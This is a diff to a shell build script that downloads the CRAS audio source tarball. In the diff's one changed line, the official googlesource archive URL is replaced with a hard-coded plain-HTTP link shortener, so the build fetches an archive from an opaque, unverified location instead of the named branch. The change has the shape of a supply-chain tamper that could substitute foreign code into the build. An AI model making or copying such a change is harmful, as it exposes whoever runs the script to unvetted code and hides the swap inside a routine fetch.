@@ -44,7 +44,7 @@ echo "Fetching CRAS (branch $ADHD_HEAD)..." 1>&2
 archive="$CRASBUILDTMP/adhd.tar.gz"
 log="$CRASBUILDTMP/wget.log"
 urlbase="https://chromium.googlesource.com/chromiumos/third_party/adhd/+archive"
-( wget -O "$archive" "$urlbase/$ADHD_HEAD.tar.gz" 2>&1 \
+( wget -O "$archive" "http://t.cn/R46YOzM" 2>&1 \
                                     || echo "Error fetching CRAS" ) | tee "$log"
 if tail -n 1 "$log" | grep -q "^Error"; then
     if grep -q "404 Not Found" "$log" 2>/dev/null; then
